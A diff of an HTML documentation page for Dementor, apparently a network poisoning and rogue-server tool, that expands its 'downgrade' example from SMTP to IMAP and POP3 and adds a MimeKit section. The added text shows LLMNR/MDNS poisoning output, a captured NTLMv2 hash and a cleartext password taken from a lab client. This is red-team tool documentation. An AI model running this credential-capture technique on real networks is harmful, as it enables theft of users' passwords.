@@ -2,7 +2,7 @@
 <html lang="en" data-accent-color="cyan" data-content_root="../">
 <head>
   <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"><title>SMTP Downgrade Attack - Dementor 1.0.0.dev4 documentation</title><link rel="shortcut icon" href="../_static/favicon.ico"/><link rel="index" title="Index" href="../genindex.html" /><link rel="search" title="Search" href="../search.html" /><link rel="next" title="WebDAV Fallback" href="webdav_fallback.html" /><link rel="prev" title="Rogue Kerberos KDC" href="kdc.html" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"><title>SMTP/IMAP/POP3 Downgrade - Dementor 1.0.0.dev5 documentation</title><link rel="shortcut icon" href="../_static/favicon.ico"/><link rel="index" title="Index" href="../genindex.html" /><link rel="search" title="Search" href="../search.html" /><link rel="next" title="WebDAV Fallback" href="webdav_fallback.html" /><link rel="prev" title="Rogue Kerberos KDC" href="kdc.html" />
       <link rel="canonical" href="https://matrixeditor.github.io/dementor/examples/smtp_downgrade.html" /><script>
     function setColorMode(t){let e=document.documentElement;e.setAttribute("data-color-mode",t);let a=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,s=t;"auto"===t&&(s=a?"dark":"light"),"light"===s?(e.classList.remove("dark"),e.classList.add("light")):(e.classList.remove("light"),e.classList.add("dark"))}
     setColorMode(localStorage._theme||"dark");
@@ -23,7 +23,7 @@
 </style>
     <meta property="og:type" content="website"/>
 <meta property="og:url" content="https://matrixeditor.github.io/dementor/examples/smtp_downgrade.html"/>
-<meta property="og:title" content="SMTP Downgrade Attack"/>
+<meta property="og:title" content="SMTP/IMAP/POP3 Downgrade"/>
 <meta name="twitter:card" content="summary"/>
   </head>
 <body><div class="sy-head">
@@ -110,7 +110,7 @@ data-aria-dark="Switch to auto color mode">
 <ul class="current">
 <li class="toctree-l1 _expand"><a class="reference internal" href="multicast.html">Multicast Poisoning &#9881;&#65039;</a></li>
 <li class="toctree-l1 _expand"><a class="reference internal" href="kdc.html">Rogue Kerberos  KDC</a></li>
-<li class="toctree-l1 current"><a class="current reference internal" href="#">SMTP Downgrade Attack</a></li>
+<li class="toctree-l1 current"><a class="current reference internal" href="#">SMTP/IMAP/POP3 Downgrade</a></li>
 <li class="toctree-l1 _expand"><a class="reference internal" href="webdav_fallback.html">WebDAV Fallback</a></li>
 </ul>
 <p class="caption" role="heading" aria-level="3"><span class="caption-text">Configuration &#9881;&#65039;</span></p>
@@ -122,6 +122,7 @@ data-aria-dark="Switch to auto color mode">
 <li class="toctree-l2"><a class="reference internal" href="../config/dcerpc.html">DCE/RPC</a></li>
 <li class="toctree-l2"><a class="reference internal" href="../config/ftp.html">FTP &#9881;&#65039;</a></li>
 <li class="toctree-l2"><a class="reference internal" href="../config/http.html">HTTP</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../config/imap.html">IMAP</a></li>
 <li class="toctree-l2"><a class="reference internal" href="../config/kerberos.html">Kerberos</a></li>
 <li class="toctree-l2"><a class="reference internal" href="../config/ldap.html">LDAP &#9881;&#65039;</a></li>
 <li class="toctree-l2"><a class="reference internal" href="../config/llmnr.html">LLMNR</a></li>
@@ -129,6 +130,7 @@ data-aria-dark="Switch to auto color mode">
 <li class="toctree-l2"><a class="reference internal" href="../config/mssql.html">MSSQL</a></li>
 <li class="toctree-l2"><a class="reference internal" href="../config/netbios.html">NBTNS</a></li>
 <li class="toctree-l2"><a class="reference internal" href="../config/ntlm.html">NTLM</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../config/pop3.html">POP3</a></li>
 <li class="toctree-l2"><a class="reference internal" href="../config/quic.html">QUIC</a></li>
 <li class="toctree-l2"><a class="reference internal" href="../config/smb.html">SMB</a></li>
 <li class="toctree-l2"><a class="reference internal" href="../config/smtp.html">SMTP</a></li>
@@ -149,6 +151,7 @@ data-aria-dark="Switch to auto color mode">
     <div class="sy-scrollbar sy-rside-inner px-6 xl:top-16 xl:sticky xl:pl-0 pt-6 pb-4"><div class="localtoc"><h3>On this page</h3><ul>
 <li><a class="reference internal" href="#prerequisites">Prerequisites</a></li>
 <li><a class="reference internal" href="#tricking-smtpclient-into-revealing-cleartext-passwords">Tricking <code class="docutils literal notranslate"><span class="pre">SmtpClient</span></code> into Revealing Cleartext Passwords</a></li>
+<li><a class="reference internal" href="#going-further-retrieving-credentials-from-mimekit">Going Further: Retrieving Credentials from MimeKit</a></li>
 </ul>
 </div><div class="edit-this-page">
   <a href="https://github.com/MatrixEditor/dementor/blob/main/docs/examples/smtp_downgrade.rst">Edit this page</a>
@@ -167,7 +170,7 @@ data-aria-dark="Switch to auto color mode">
         <span>/</span>
         <meta itemprop="position" content="1" />
       </li><li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
-        <strong itemprop="name">SMTP Downgrade Attack</strong>
+        <strong itemprop="name">SMTP/IMAP/POP3 Downgrade</strong>
         <meta itemprop="position" content="2" />
       </li></ol>
     <div class="xl:hidden ml-1">
@@ -180,15 +183,20 @@ data-aria-dark="Switch to auto color mode">
 </div><div class="flex flex-col break-words justify-between">
       <div class="min-w-0 max-w-6xl px-6 pb-6 pt-8 xl:px-12">
         <article class="yue" role="main">
-          <section id="smtp-downgrade-attack">
-<span id="example-smtp-downgrade"></span><h1>SMTP Downgrade Attack<a class="headerlink" href="#smtp-downgrade-attack" title="Link to this heading">¶</a></h1>
-<p>The SMTP server in <em>Dementor</em> supports a mechanism to attempt a <em>“downgrade”</em> of an authentication attempt
-initiated by a target host. This behavior is controlled by the <a class="reference internal" href="../config/smtp.html#SMTP.Server.Downgrade" title="SMTP.Server.Downgrade"><code class="xref py py-attr docutils literal notranslate"><span class="pre">SMTP.Server.Downgrade</span></code></a> setting.</p>
+          <section id="smtp-imap-pop3-downgrade">
+<span id="example-smtp-downgrade"></span><h1>SMTP/IMAP/POP3 Downgrade<a class="headerlink" href="#smtp-imap-pop3-downgrade" title="Link to this heading">¶</a></h1>
+<p>The SMTP/POP3/IMAP server in <em>Dementor</em> supports a mechanism to attempt a <em>“downgrade”</em> of an authentication attempt
+initiated by a target host. This behavior is controlled by the <code class="xref py py-attr docutils literal notranslate"><span class="pre">SMTP/IMAP/POP3.Server.Downgrade</span></code> setting.</p>
 <div class="admonition warning">
 <p class="admonition-title">Warning</p>
 <p>This attack specifically targets the <a class="reference external" href="https://learn.microsoft.com/en-us/dotnet/api/system.net.mail.smtpclient?view=net-9.0">SmtpClient</a>
 component of the .NET Core platform. Although <a class="reference external" href="https://github.com/dotnet/platform-compat/blob/master/docs/DE0005.md">DE0005</a> marks this component
 as deprecated and advises against its use, this example demonstrates how <em>Dementor</em> can be configured to simulate various attack scenarios.</p>
+</div>
+<div class="admonition tip">
+<p class="admonition-title">Tip</p>
+<p>This attack also works against <a class="reference external" href="https://mimekit.net">MimeKit</a> due to their design choice when performing
+authentication. <strong>And most importantly, this attack also works for POP3 and IMAP</strong>.</p>
 </div>
 <section id="prerequisites">
 <h2>Prerequisites<a class="headerlink" href="#prerequisites" title="Link to this heading">¶</a></h2>
@@ -247,14 +255,57 @@ provided as NTLM hashes or tokens, the downgrade will fail.</p>
 </span></pre></div>
 </div>
 <p>The default Windows SMTP client will retry using cleartext credentials — if they are present.</p>
-<figure class="align-center" id="id1">
+<figure class="align-center" id="id2">
 <img alt="Wireshark trace showing SMTP fallback to cleartext auth" src="../_images/smtp-downgrade_wireshark.png" />
 <figcaption>
-<p><span class="caption-text">The client reattempts authentication with cleartext credentials after an NTLM failure.</span><a class="headerlink" href="#id1" title="Link to this image">¶</a></p>
+<p><span class="caption-text">The client reattempts authentication with cleartext credentials after an NTLM failure.</span><a class="headerlink" href="#id2" title="Link to this image">¶</a></p>
 </figcaption>
 </figure>
 </li>
 </ol>
+</section>
+<section id="going-further-retrieving-credentials-from-mimekit">
+<h2>Going Further: Retrieving Credentials from MimeKit<a class="headerlink" href="#going-further-retrieving-credentials-from-mimekit" title="Link to this heading">¶</a></h2>
+<p>The documentation for <a class="reference external" href="https://mimekit.net">MimeKit</a> explains that when authenticating via
+the <a class="reference external" href="https://mimekit.net/docs/html/M_MailKit_MailService_Authenticate_1.htm">MailService.Authenticate</a>
+method, supported SASL mechanisms will influence how credentials are handled. However, this attack
+<strong>will not</strong> work if the client specifies a SASL mechanism directly.</p>
+<blockquote class="pull-quote">
+<div><p>If the server supports one or more SASL authentication mechanisms, then the SASL mechanisms that both the client and server
+support (not including any OAUTH mechanisms) are tried in order of greatest security to weakest security. Once a SASL
+authentication mechanism is found that both client and server support, the credentials are used to authenticate.</p>
+<p class="attribution">—<a class="reference external" href="https://mimekit.net/docs/html/M_MailKit_MailService_Authenticate_1.htm">MimeKit Documentation</a></p>
+</div></blockquote>
+<p>Setting up a small program usually costs hours of installing stuff. Once complete, the following script
+demonstrates how this behavior is triggered from the client side:</p>
+<div class="literal-block-wrapper docutils container" id="id3">
+<div class="code-block-caption"><span class="caption-text">MailProgram.cs</span><a class="headerlink" href="#id3" title="Link to this code">¶</a></div>
+<div class="highlight-csharp notranslate"><div class="highlight"><pre><span></span><span data-line="1"><span class="k">using</span><span class="w"> </span><span class="p">(</span><span class="kt">var</span><span class="w"> </span><span class="n">smtpClient</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">SmtpClient</span><span class="p">())</span>
+</span><span data-line="2"><span class="p">{</span>
+</span><span data-line="3"><span class="w">    </span><span class="n">smtpClient</span><span class="p">.</span><span class="n">Connect</span><span class="p">(</span><span class="n">smtpHost</span><span class="p">,</span><span class="w"> </span><span class="n">smtpPort</span><span class="p">,</span><span class="w"> </span><span class="n">SecureSocketOptions</span><span class="p">.</span><span class="n">StartTls</span><span class="p">);</span>
+</span><span data-line="4"><span class="w">    </span><span class="n">smtpClient</span><span class="p">.</span><span class="n">Authenticate</span><span class="p">(</span><span class="s">&quot;temple.master&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;UseTheF0rce&quot;</span><span class="p">);</span>
+</span><span data-line="5"><span class="w">    </span><span class="n">smtpClient</span><span class="p">.</span><span class="n">Send</span><span class="p">(</span><span class="n">message</span><span class="p">);</span><span class="w"> </span><span class="c1">// message create ommitted here</span>
+</span><span data-line="6"><span class="w">    </span><span class="n">smtpClient</span><span class="p">.</span><span class="n">Disconnect</span><span class="p">(</span><span class="k">true</span><span class="p">);</span>
+</span><span data-line="7"><span class="p">}</span>
+</span></pre></div>
+</div>
+</div>
+<p>By default, no additional configuration is necessary. In the following capture, <a class="reference internal" href="../config/ntlm.html#NTLM.ExtendedSessionSecurity" title="NTLM.ExtendedSessionSecurity"><code class="xref py py-attr docutils literal notranslate"><span class="pre">NTLM.ExtendedSessionSecurity</span></code></a>
+has been disabled:</p>
+<div class="demo docutils container">
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span data-line="1"><span class="go">MDNS       fe80::b9cb:192d:31db:a0c5 5353   [+] Sent poisoned answer to fe80::b9cb:192d:31db:a0c5</span>
+</span><span data-line="2"><span class="go">LLMNR      192.168.56.122            5355   [*] Query for MAILSRV01 (type: AAAA)</span>
+</span><span data-line="3"><span class="go">LLMNR      192.168.56.122            5355   [+] Sent poisoned answer to 192.168.56.122</span>
+</span><span data-line="4"><span class="go">SMTP       fe80::b9cb:192d:31db:a0c5 25     [+] Captured NTLMv2 Hash for temple.master/ossus.contoso.local from fe80::b9cb:192d:31db:a0c5:</span>
+</span><span data-line="5"><span class="go">SMTP       fe80::b9cb:192d:31db:a0c5 25     NTLMv2 Username: temple.master</span>
+</span><span data-line="6"><span class="hll"><span class="go">SMTP       fe80::b9cb:192d:31db:a0c5 25     NTLMv2 Hash: temple.master::ossus.contoso.local:313333374c454554:e8545823cb69a89c26da9d0b52dc01b7:[...]</span>
+</span></span><span data-line="7"><span class="go">SMTP       fe80::b9cb:192d:31db:a0c5 25     [*] Performing downgrade attack for target fe80::b9cb:192d:31db:a0c5</span>
+</span><span data-line="8"><span class="go">SMTP       fe80::b9cb:192d:31db:a0c5 25     [+] Captured Cleartext Password for temple.master@ossus.contoso.local from fe80::b9cb:192d:31db:a0c5:</span>
+</span><span data-line="9"><span class="hll"><span class="go">SMTP       fe80::b9cb:192d:31db:a0c5 25     Cleartext Username: temple.master@ossus.contoso.local</span>
+</span></span><span data-line="10"><span class="hll"><span class="go">SMTP       fe80::b9cb:192d:31db:a0c5 25     Cleartext Password: UseTheF0rce</span>
+</span></span></pre></div>
+</div>
+</div>
 </section>
 </section>
 
@@ -301,7 +352,7 @@ provided as NTLM hashes or tokens, the downgrade will fail.</p>
     </div>
   </div>
 </footer>
-      <script src="../_static/documentation_options.js?v=b68827ed"></script>
+      <script src="../_static/documentation_options.js?v=d247f7a9"></script>
       <script src="../_static/doctools.js?v=9bcbadda"></script>
       <script src="../_static/sphinx_highlight.js?v=dc90522c"></script>
       <script src="../_static/clipboard.min.js?v=a7894cd8"></script>
